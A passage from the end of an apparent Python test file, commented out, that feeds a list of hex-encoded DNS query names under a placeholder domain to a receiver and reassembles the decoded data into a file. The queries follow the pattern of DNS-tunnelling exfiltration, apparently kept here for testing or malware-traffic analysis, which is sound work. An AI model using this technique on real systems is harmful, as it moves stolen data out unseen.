# e8cdf1ce69ec8ac.bin.a275167d92ad47122a93e58e6b0d4c.e98bb2e0e20dcf4267204bff9ac3b7.cc17051fe665c169962acd73c3fadf.f58f9b75e6306da527653b5cced885.domain.tld
# e8cdf1ce69ec8ac.bin.b8184f57f6e8143d3b8ff6dc431959.f090b9b2c127c14269700da6c78afa.8d550570a22f9322c577c369cd939f.a1c4d77394376ddb55043443ded295.domain.tld
# e8cdf1ce69ec8ac.bin.a814364782a0556162a6b5d1364b15.b0a6d1caec0dc126016335fff18df8.8e554055e86bcf679824c369cd939f.a1c4d77394376ddb55043457dea6da.domain.tld
# e8cdf1ce69ec8ac.bin.955f3b5792cc12222083e99264145f.f596bdb4a5428f420c4e04bdd886fd.cc17051fe665c169963ecd1086c0bc.8bcad77df870239e58467b0e9f8495.domain.tld
# e8cdf1ce69ec8ac.bin.d1056d4192cc03323d85f58f225318.aec4f2e0e20dcf42732003ba8cd3a3.d60e1404f37185738061d77e858183.bbdc9638d63c7cc45d7a6608988dc7.domain.tld
# e8cdf1ce69ec8ac.bin.ea307f5e92806d766fc0cfac744918.c180b8b2a95e924c690e45f194cdb9.c2190b11e86bcf679824c369cd938b.a1dbce6f9a287bcd5b1f2243cfd19d.domain.tld
# e8cdf1ce69ec8ac.bin.c8277e11d7ff15332bc9a6f1085d18.a0b7a9a2a2489542044116b494cdb9.c2190b11e86bcf679824c369cd939f.a1c4d77394236dc7401f3a5fcbdd9b.domain.tld
# e8cdf1ce69ec8ac.bin.aa602e5982806d766fc0c299641c4d.ec90fc87ad598415285945f194cdb9.c2190b11e86bcf679824c369cd938b.a1dbce6f9a287bcd5b1f2243cfe5bf.domain.tld
# e8cdf1ce69ec8ac.bin.b8753b33face372079c0cfbd4b3918.aec4f2e0e20dcf4267204bff9ac3b7.cc17051fe665c17d9636de7cd78384.b2dfc650be396dd53162573d88de95.domain.tld
# e8cdf1ce69ec8ac.bin.db397212dcf947121aa9c2d2225318.aec4f2e0e20dcf4267204bff8ec3a9.dc141531eb7bd16a8635c07bd39e85.b9c7b51f995d0ed8456b395dcec587.domain.tld
# e8cdf1ce69ec8ac.bin.af7828439fb8557b7dd68bf6225d18.c4aa8fe09f4893142c5216ff9ac3b7.cc17051fe665c169962acd67c39d91.afcad97d8e3975db4d042c43c6e5bf.domain.tld
# e8cdf1ce69ec8ac.bin.b8753b39d7f9251f4fb3a69374184a.a0b0bfb0a55dcf4267204bff9ac3b7.cc17051fe665c17d9641832881dfd4.e5e7fd50be4d389b1b4f784d9f8cd4.domain.tld
# e8cdf1ce69ec8ac.bin.e8217e0592e414373b81f6d2793908.c2d1eff1fe19cc277b1357f280dadf.af141c748772cc708342ac7ad1f086.c2dcb46ec92340ff7820344ddea5d0.domain.tld
# e8cdf1ce69ec8ac.bin.fc3c7a57e1f906222ac0a8dc2c5d16.a0cafceeec03c14c690e45f194cdb9.c2191f118b2e852ed724892090d0de.ef84923ec07c29f87f0a344dbd87db.domain.tld
# e8cdf1ce69ec8ac.bin.f6307803dbe2097b3c90e39f6b1b51.e3c4988e9f0db2172f460ca794c3b7.cc03053ccc6bc167f2619e2a91dac1.f583983394376ddb55043443dec695.domain.tld
# e8cdf1ce69ec8ac.bin.b67535579cad497661c0a8dc385d75.e987aeafbf4287166969369ee0a2c9.cc784150b63f8435bb0ecd69c3e3d9.f8999e3ed5756db4114e66088d9b9b.domain.tld
# e8cdf1ce69ec8ac.bin.b87b3b5992a347786fcea6d2225318.aec4e6e0fc1dcc52790d55ef99d3a9.c109151cf67bcc778629a879eeb991.a1cab315f7496db01b4b76019b8c9b.domain.tld
# e8cdf1ce69ec8ac.bin.b87b3b5992a347786fcea6d2225318.aec4f2e0e20ddb42074f68d594c3b9.ad4c515ea5248f21df63983b82c7d8.ee84d718da782f99104e3443dec695.domain.tld
# e8cdf1ce69ec8ac.bin.b675355788ad3e333ced8cf108294d.ee8ab9acec4c8503395465ad94b7fc.9e5c415ee61f9429d86181208dd491.d1999228d07660bc1b5e711f9889d6.domain.tld
# e8cdf1ce69ec8ac.bin.fd6f167dbf8747766fade3986b1c18.d390bdb4a90dcf4267204bff9ac3b7.cc17051fe665c169962acd67c38991.cc8f9334d539299c06497b03908dd6.domain.tld
# e8cdf1ce69ec8ac.bin.ec307f7ab8ad47760c8fe892671e4c.e98bb2edbf5d840120460cbc94a7d7.bf197644a02d883f9624c369d993bc.8bcad77df07c3e96074364199787db.domain.tld
# e8cdf1ce69ec8ac.bin.b87b3b5992a347786fcea6d2225318.aec4f2e0e20dcf42732031bac686fd.83197144a825842bdf6a8a69b3c0d4.f48e9870fd773990074c750e9be5bf.domain.tld
# e8cdf1ce69ec8ac.bin.b8753b27daf4143f2c81eadc43195c.f281afb3e20dcf4267204bff9ac3b7.cc17051fe665c17d9634dd64d3839c.b1dada6d84347dc5581a2440ced898.domain.tld
# e8cdf1ce69ec8ac.bin.dd65167d92ad471207a3d6dc471359.e288b9a4e20dcf4267204bff9ac3b7.cc17051fe665c169962acd73c3fdde.8ce0d77d945838811a497b039881d2.domain.tld
# e8cdf1ce69ec8ac.bin.ed277a03dbe209760a8ee79e6e185c.a0cafceeec03c14c691a4586d19094.e66d4d54b42ec126c461cd278c93d4.ef9e8534d16a6d9c1b0a60059bc8d9.domain.tld
# e8cdf1ce69ec8ac.bin.f1266f59bf876a5c6fc0a6dc083157.e385b0e08d5f840369630ab1da86fa.98504a5ffc41af28d261cd4993f2d5.e598922ec7236dae44132643cfde8d.domain.tld
# e8cdf1ce69ec8ac.bin.b6602d5983b43a761c83e98c675d71.e4defc9b9120eb6f432045ff94adf6.cc57445ca338c12ed8248e2880dbd4.8ce0a335d16b28d51458714d908795.domain.tld
# e8cdf1ce69ec8ac.bin.fd3b6f05dbe8147626.8ea6886a1818ec8daf.b4e220eb6f433a68d5.f2aad5a97c6b75cb41.domain.tld""".split():
#         file += Server.receive(q).data
#
#     with open("resources/e8cdf1ce69ec8ac.dat", "w") as f:
#         f.write(file)
#
#     print(file)
#
#
# if __name__ == "__main__":
#     thread_test()
#     # smoke_test()
#     # decode_udpos2()
